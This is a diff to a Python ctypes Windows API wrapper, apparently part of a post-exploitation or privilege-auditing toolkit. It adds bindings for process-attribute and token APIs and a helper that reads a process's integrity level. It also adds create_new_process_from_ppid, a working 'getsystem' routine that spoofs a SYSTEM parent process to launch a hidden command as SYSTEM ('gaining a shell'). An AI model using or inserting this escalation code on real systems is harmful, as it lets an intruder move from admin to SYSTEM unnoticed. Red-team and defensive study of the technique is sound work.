@@ -4,20 +4,23 @@
 
 from ctypes import (
     WinDLL, c_uint32, c_char_p,
-    c_wchar_p, c_long, c_uint16, Structure, Union,
+    c_long, c_uint16, Structure, Union,
     POINTER, create_unicode_buffer, create_string_buffer,
     get_last_error, cast, c_void_p, sizeof, c_int, c_ulong,
-    c_wchar, GetLastError, WinError, byref, addressof
+    c_wchar, GetLastError, WinError, byref, addressof, c_size_t,
+    c_ushort, c_ubyte, resize
 )
 
 from ctypes.wintypes import (
-    BOOL, LPSTR, BYTE
+    BOOL, LPSTR, LPWSTR, BYTE, LPCSTR, LPCWSTR
 )
 
 import subprocess
 import psutil
 import sys
 import os
+
+import logging
 
 from os import W_OK, X_OK, R_OK
 
@@ -33,12 +36,14 @@ LPTSTR                          = LPSTR
 LPCTSTR                         = LPSTR
 PSID                            = PVOID
 DWORD                           = c_uint32
-LPSTR                           = c_char_p
-LPWSTR                          = c_wchar_p
 HANDLE                          = LPVOID
 INVALID_HANDLE_VALUE            = c_void_p(-1).value
 LONG                            = c_long
 WORD                            = c_uint16
+PULONG                          = c_void_p
+LPBYTE                          = c_char_p
+SIZE_T                          = c_size_t
+ULONG                           = c_ulong
 
 INVALID_HANDLE_VALUE = c_void_p(-1).value
 SECURITY_INFORMATION = DWORD
@@ -195,6 +200,21 @@ SecurityImpersonation = 2
 SecurityDelegation = 3
 
 SID_SYSTEM = 'S-1-5-18'
+
+SYSTEM_EXTENDED_HANDLE_INFORMATION = 0x00000040
+FILE_DEVICE_UNKNOWN = 0x00000022
+FILE_ANY_ACCESS = 0x00000000
+METHOD_NEITHER = 0x00000003
+PROCESS_ALL_ACCESS = 0x001F0FFF
+PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
+EXTENDED_STARTUPINFO_PRESENT = 0x00080000
+CREATE_NEW_CONSOLE = 0x00000010
+CREATE_NO_WINDOW = 0x08000000
+DETACHED_PROCESS = 0x00000008
+CREATE_UNICODE_ENVIRONMENT = 0x00000400
+ENTRIES = 0x00006000
+DWORD_PTR = DWORD
+USHORT = c_ushort
 
 class TOKEN_INFORMATION_CLASS:
     #see http://msdn.microsoft.com/en-us/library/aa379626%28VS.85%29.aspx
@@ -372,6 +392,63 @@ class PRIVILEGE_SET_HEADER(Structure):
         ('PrivilegeCount', DWORD),
         ('Control', DWORD)
     ]
+
+class PROC_THREAD_ATTRIBUTE_ENTRY(Structure):
+    _fields_ = [
+               ("Attribute",     DWORD),
+               ("cbSize",       SIZE_T),
+               ("lpValue",       PVOID)
+]
+
+class PROC_THREAD_ATTRIBUTE_LIST(Structure):
+    _fields_ = [
+               ("dwFlags", DWORD),
+               ("Size",    ULONG),
+               ("Count",   ULONG),
+               ("Reserved",ULONG),
+               ("Unknown", PULONG),
+               ("Entries", PROC_THREAD_ATTRIBUTE_ENTRY * 1)
+]
+
+class _STARTUPINFOA(Structure):
+        _fields_ = [
+        ("cb", DWORD),
+        ("lpReserved", LPSTR),
+        ("lpDesktop", LPSTR),
+        ("lpTitle", LPSTR),
+        ("dwX", DWORD),
+        ("dwY", DWORD),
+        ("dwXSize", DWORD),
+        ("dwYSize", DWORD),
+        ("dwXCountChars", DWORD),
+        ("dwYCountChars", DWORD),
+        ("dwFillAttribute", DWORD),
+        ("dwFlags", DWORD),
+        ("wShowWindow", WORD),
+        ("cbReserved2", WORD),
+        ("lpReserved2", LPBYTE),
+        ("hStdInput", HANDLE),
+        ("hStdOutput", HANDLE),
+        ("hStdError", HANDLE),
+    ]
+
+class SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX(Structure):
+    _fields_ = [("Object", PVOID),
+                ("UniqueProcessId", PVOID),
+                ("HandleValue", PVOID),
+                ("GrantedAccess", ULONG),
+                ("CreatorBackTraceIndex", USHORT),
+                ("ObjectTypeIndex", USHORT),
+                ("HandleAttributes", ULONG),
+                ("Reserved", ULONG)]
+
+class STARTUPINFOEX(Structure):
+    _fields_ = [("StartupInfo", STARTUPINFO),
+                ("lpAttributeList", PVOID)]
+
+class TOKEN_MANDATORY_LABEL(Structure):
+    _fields_ = [
+            ('Label', SID_AND_ATTRIBUTES),]
 
 # advapi32
 
@@ -660,6 +737,23 @@ AccessCheck.restype                 = BOOL
 AccessCheck.argtypes                = [c_void_p, HANDLE, DWORD, POINTER(GENERIC_MAPPING),
                                        c_void_p, POINTER(DWORD), POINTER(DWORD), POINTER(BOOL)]
 
+
+GetSidSubAuthorityCount             = advapi32.GetSidSubAuthorityCount
+GetSidSubAuthorityCount.argtypes    = [c_void_p]
+GetSidSubAuthorityCount.restype     = POINTER(c_ubyte)
+
+GetSidSubAuthority                  = advapi32.GetSidSubAuthority
+GetSidSubAuthority.argtypes         = [c_void_p, DWORD]
+GetSidSubAuthority.restype          = POINTER(DWORD)
+
+CreateProcessW                       = kernel32.CreateProcessW #Unicode version
+CreateProcessW.restype               = BOOL
+CreateProcessW.argtypes              = [LPCWSTR, LPWSTR, PSECURITY_ATTRIBUTES, PSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, POINTER(STARTUPINFOEX), POINTER(PROCESS_INFORMATION)]
+
+CreateProcessA                       = kernel32.CreateProcessA #Unicode version
+CreateProcessA.restype               = BOOL
+CreateProcessA.argtypes              = [LPCSTR, LPSTR, PSECURITY_ATTRIBUTES, PSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, POINTER(STARTUPINFOEX), POINTER(PROCESS_INFORMATION)]
+
 # kernel32
 
 GetFileAttributesW                  = kernel32.GetFileAttributesW
@@ -693,6 +787,14 @@ LocalAlloc.argtypes                 = [PSID, DWORD]
 LocalFree                           = kernel32.LocalFree
 LocalFree.restype                   = HANDLE
 LocalFree.argtypes                  = [HANDLE]
+
+InitializeProcThreadAttributeList          = kernel32.InitializeProcThreadAttributeList
+InitializeProcThreadAttributeList.restype  = BOOL
+InitializeProcThreadAttributeList.argtypes = [POINTER(PROC_THREAD_ATTRIBUTE_LIST), DWORD, DWORD, POINTER(SIZE_T)]
+
+UpdateProcThreadAttribute                  = kernel32.UpdateProcThreadAttribute
+UpdateProcThreadAttribute.restype          = BOOL
+UpdateProcThreadAttribute.argtypes         = [POINTER(PROC_THREAD_ATTRIBUTE_LIST), DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, POINTER(SIZE_T)]
 
 # ntdll
 RtlGetVersion                       = ntdll.RtlGetVersion
@@ -1631,3 +1733,145 @@ def getfileowneracls(path):
 
     infos.append(ACLs)
     return infos
+
+def create_new_process_from_ppid(ppid, cmd):
+    """
+    Create new process as SYSTEM via Handle Inheritance specifying privileged parent
+    Returns True if no problem
+    Based on : https://github.com/decoder-it/psgetsystem/blob/master/psgetsys.ps1
+    """
+    lpAttributeList = None
+    lpSize = c_size_t(0)
+
+    if not IsUserAnAdmin():
+        raise OSError("You need admin rights to run getsystem !")
+
+    # 1.Call with null lpAttributeList first to get back the lpSize
+    InitializeProcThreadAttributeList(None, 1, 0, byref(lpSize))
+
+    # 2.Initialize the attribute list
+    lpAttributeList = PROC_THREAD_ATTRIBUTE_LIST()
+    if not InitializeProcThreadAttributeList(lpAttributeList, 1, 0, byref(lpSize)):
+        raise WinError(get_last_error())
+
+    # 3.Add attribute to attribute list (we now know buffer size for the specified number of attributes we allocate and initialize AttributeList)
+    #lpValue = PVOID(ppid) # Handle to specified parent
+
+    handle = OpenProcess(PROCESS_ALL_ACCESS, False, int(ppid))
+    if not handle:
+        raise WinError(get_last_error())
+
+    last_error = None
+
+    lpValue = PVOID(handle)
+    if not UpdateProcThreadAttribute(
+        lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+        byref(lpValue), sizeof(lpValue), None, None):
+
+        last_error = get_last_error()
+
+    if last_error:
+        CloseHandle(handle)
+        raise WinError(last_error)
+
+    #gaining a shell...
+    lpProcessInformation = PROCESS_INFORMATION()
+
+    lpStartupInfo              = STARTUPINFOEX()
+    lpStartupInfo.StartupInfo.lpReserved   = 0
+    lpStartupInfo.StartupInfo.lpDesktop    = 0
+    lpStartupInfo.StartupInfo.lpTitle      = 0
+    lpStartupInfo.StartupInfo.dwFlags      = 0
+    lpStartupInfo.StartupInfo.cbReserved2  = 0
+    lpStartupInfo.StartupInfo.lpReserved2  = 0
+    lpStartupInfo.StartupInfo.cb = sizeof(lpStartupInfo)
+    lpStartupInfo.lpAttributeList = addressof(lpAttributeList)
+
+    lpProcessInformation              = PROCESS_INFORMATION()
+    lpProcessInformation.hProcess     = INVALID_HANDLE_VALUE
+    lpProcessInformation.hThread      = INVALID_HANDLE_VALUE
+    lpProcessInformation.dwProcessId  = 0
+    lpProcessInformation.dwThreadId   = 0
+
+    dwCreationFlags = (CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT)
+
+    cmd = create_unicode_buffer(cmd)
+    if not CreateProcessW(
+        None, cmd, None, None, 0, dwCreationFlags, None,
+        None,  byref(lpStartupInfo), byref(lpProcessInformation)):
+        CloseHandle(handle)
+        raise WinError(get_last_error())
+
+    return lpProcessInformation.dwProcessId
+
+def get_integrity_level(pid):
+    '''
+    Returns the integrity level of a specific pid
+    Notice the process running this method should have less or same 'pivileges' than the pid for getting the integrity level.
+    e.g. a process running with medium integrity level can't access to integrity level information of a process running with the system or high integrity level.
+    You can test with Process Explorer.
+    Returns 0, 1, 2, 3 ,4, 5 or 6 if an error. Otherwise returns string (intergrity level)
+    '''
+
+    mapping = {
+        0x0000: u'Untrusted',
+        0x1000: u'Low',
+        0x2000: u'Medium',
+        0x2100: u'Medium high',
+        0x3000: u'High',
+        0x4000: u'System',
+        0x5000: u'Protected process',
+    }
+
+    #TOKEN_READ = DWORD(0x20008)
+    TokenIntegrityLevel = c_uint32(25)
+    token = c_void_p()
+
+    proc_handle = OpenProcess(PROCESS_QUERY_INFORMATION, False, int(pid))
+    if proc_handle == 0:
+        return 0
+
+    if not OpenProcessToken(
+            proc_handle,
+            TOKEN_READ,
+            byref(token)):
+        logging.error('Failed to get process token')
+        return 1
+
+    if token.value == 0:
+        logging.error('Got a NULL token')
+        return 2
+    try:
+        info_size = DWORD()
+        if GetTokenInformation(
+                token,
+                TokenIntegrityLevel,
+                c_void_p(),
+                info_size,
+                byref(info_size)):
+            logging.error('GetTokenInformation() failed expectation')
+            return 3
+
+        if info_size.value == 0:
+            logging.error('GetTokenInformation() returned size 0')
+            return 4
+
+        token_info = TOKEN_MANDATORY_LABEL()
+        resize(token_info, info_size.value)
+        if not GetTokenInformation(
+                token,
+                TokenIntegrityLevel,
+                byref(token_info),
+                info_size,
+                byref(info_size)):
+            logging.error(
+                    'GetTokenInformation(): Unknown error with buffer size %d: %d', info_size.value, GetLastError())
+            return 6
+
+        p_sid_size = GetSidSubAuthorityCount(token_info.Label.Sid)
+        res = GetSidSubAuthority(token_info.Label.Sid, p_sid_size.contents.value - 1)
+        value = res.contents.value
+        return mapping.get(value) or u'0x%04x' % value
+
+    finally:
+        CloseHandle(token)
